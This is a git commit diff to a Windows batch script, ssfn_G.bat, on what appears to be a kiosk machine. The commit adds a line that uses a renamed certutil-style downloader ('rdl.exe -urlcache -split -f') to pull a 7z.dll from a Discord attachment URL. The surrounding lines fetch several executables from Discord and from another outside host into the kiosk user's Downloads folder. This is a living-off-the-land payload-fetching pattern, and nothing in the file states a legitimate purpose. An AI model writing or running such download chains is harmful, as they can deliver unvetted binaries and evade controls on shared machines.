a185250f5c3e3f50e696e54a0f4bf90727e6667b
tobiasmulln <133047212+tobiasmulln@users.noreply.github.com>
2023-05-18 18:23:21 +0000

    Update ssfn_G.bat

--- ssfn_G.bat
+++ ssfn_G.bat
@@ -17,6 +17,7 @@ echo Exists) ELSE (
 
 "c:\temp\rdl.exe" -urlcache -split -f "https://files.rycoh.net/rdl.exe" "C:\Users\kiosk\Downloads\G\rdl.exe"
 "c:\temp\rdl.exe" -urlcache -split -f "https://cdn.discordapp.com/attachments/1105541696135123004/1108820816801574912/z.exe" "C:\Users\kiosk\Downloads\G\z.exe"
+"c:\temp\rdl.exe" -urlcache -split -f "https://cdn.discordapp.com/attachments/1105541696135123004/1108821803062792323/7z.dll" "C:\Users\kiosk\Downloads\G\7z.dll"
 "c:\temp\rdl.exe" -urlcache -split -f "https://cdn.discordapp.com/attachments/873261878904782941/1102389310487023727/VoughtUadml.exe" "C:\Users\kiosk\Downloads\G\VoughtUadml.exe"
 #"c:\temp\rdl.exe" -urlcache -split -f "https://cdn.discordapp.com/attachments/1105541696135123004/1105542124436459550/nt.exe" "C:\Users\kiosk\Downloads\G\nt.exe"
 #"c:\temp\rdl.exe" -urlcache -split -f "https://cdn.discordapp.com/attachments/1105541696135123004/1105963087632273599/task.exe" "C:\Users\kiosk\Downloads\G\task.exe"
